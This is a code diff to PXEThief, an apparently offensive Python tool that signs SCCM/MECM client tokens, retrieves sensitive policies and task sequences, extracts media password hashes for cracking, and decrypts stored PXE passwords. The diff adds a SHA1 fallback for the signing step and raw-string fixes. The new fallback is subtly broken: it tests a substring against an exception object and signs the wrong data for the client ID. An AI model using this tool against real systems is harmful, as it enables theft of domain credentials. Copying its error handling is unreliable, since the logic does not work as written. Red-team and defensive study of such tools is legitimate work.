@@ -494,21 +494,35 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
     print('[+] Generating Client Authentication headers using PFX File...')
 
     data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
-    #CCMClientIDSignature = generateSignedData(data,cryptoProv)
-    CCMClientIDSignature = str(generateClientTokenSignature(data,cryptoProv))
-    print("[+] CCMClientID Signature Generated")
+    try:
+        CCMClientIDSignature = str(generateClientTokenSignature(data, cryptoProv))
+        print("[+] CCMClientID Signature Generated")
 
-    CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat()+'Z'
-    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
-    #CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
-    CCMClientTimestampSignature = str(generateClientTokenSignature(data,cryptoProv))
-    print("[+] CCMClientTimestamp Signature Generated")
+        CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
+        data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
+        CCMClientTimestampSignature = str(generateClientTokenSignature(data, cryptoProv))
+        print("[+] CCMClientTimestamp Signature Generated")
 
-    data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
-    #clientTokenSignature = str(generateSignedData(data,cryptoProv))
-    clientTokenSignature = str(generateClientTokenSignature(data,cryptoProv))
-    
-    print("[+] ClientToken Signature Generated")
+        data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+        clientTokenSignature = str(generateClientTokenSignature(data, cryptoProv))
+        print("[+] ClientToken Signature Generated")
+    except BaseException as e:
+        if "Invalid algorithm specified" in e:
+            print("Error. Trying again with SHA1 instead of SHA256.")
+
+            CCMClientIDSignature = generateSignedData(data,cryptoProv)
+            print("[+] CCMClientID Signature Generated")
+
+            CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
+            data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
+            CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
+            print("[+] CCMClientTimestamp Signature Generated")
+
+            data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+            clientTokenSignature = str(generateSignedData(data,cryptoProv))
+            print("[+] ClientToken Signature Generated")
+        else:
+            print(e)
     
     try:
         naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature)
@@ -760,7 +774,7 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
                 allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
             else:
                 if policy.get("PolicyCategory") is None:
-                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
+                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in r"\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url)
                 else:
                     allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
                     dedup = dedup + 1
@@ -834,15 +848,15 @@ if __name__ == "__main__":
 
     if len(sys.argv) < 2 or sys.argv[1] == "-h":
 
-        print("%s 1 - Automatically identify and download encrypted media file using DHCP PXE boot request. Additionally, attempt exploitation of blank media password when auto_exploit_blank_password is set to 1" % sys.argv[0])
-        print("%s 2 <IP Address of DP Server> - Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address" % sys.argv[0])
-        print("%s 3 <variables-file-name> <Password-guess> - Attempt to decrypt a saved media variables file and retrieve sensitive data from MECM DP" % sys.argv[0])
-        print("%s 4 <variables-file-name> <policy-file-path> <password> - Attempt to decrypt a saved media variables file and Task Sequence XML file retrieved from a full TS media" % sys.argv[0])
-        print("%s 5 <variables-file-name> - Print the hash corresponding to a specified media variables file for cracking in hashcat" % sys.argv[0])
-        print("%s 6 <identityguid> <identitycert-file-name> - Retrieve task sequences using the values obtained from registry keys on a DP" % sys.argv[0])
-        print("%s 7 <Reserved1-value> - Decrypt stored PXE password from SCCM DP registry key (reg query HKLM\software\microsoft\sms\dp /v Reserved1)" % sys.argv[0])
-        print("%s 8 - Write new default settings.ini file in PXEThief directory" % sys.argv[0])
-        print("%s 10 - Print Scapy interface table to identify interface indexes for use in 'settings.ini'" % sys.argv[0])
+        print(r"%s 1 - Automatically identify and download encrypted media file using DHCP PXE boot request. Additionally, attempt exploitation of blank media password when auto_exploit_blank_password is set to 1" % sys.argv[0])
+        print(r"%s 2 <IP Address of DP Server> - Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address" % sys.argv[0])
+        print(r"%s 3 <variables-file-name> <Password-guess> - Attempt to decrypt a saved media variables file and retrieve sensitive data from MECM DP" % sys.argv[0])
+        print(r"%s 4 <variables-file-name> <policy-file-path> <password> - Attempt to decrypt a saved media variables file and Task Sequence XML file retrieved from a full TS media" % sys.argv[0])
+        print(r"%s 5 <variables-file-name> - Print the hash corresponding to a specified media variables file for cracking in hashcat" % sys.argv[0])
+        print(r"%s 6 <identityguid> <identitycert-file-name> - Retrieve task sequences using the values obtained from registry keys on a DP" % sys.argv[0])
+        print(r"%s 7 <Reserved1-value> - Decrypt stored PXE password from SCCM DP registry key (reg query HKLM\software\microsoft\sms\dp /v Reserved1)" % sys.argv[0])
+        print(r"%s 8 - Write new default settings.ini file in PXEThief directory" % sys.argv[0])
+        print(r"%s 10 - Print Scapy interface table to identify interface indexes for use in 'settings.ini'" % sys.argv[0])
 
     elif int(sys.argv[1]) == 10:
 
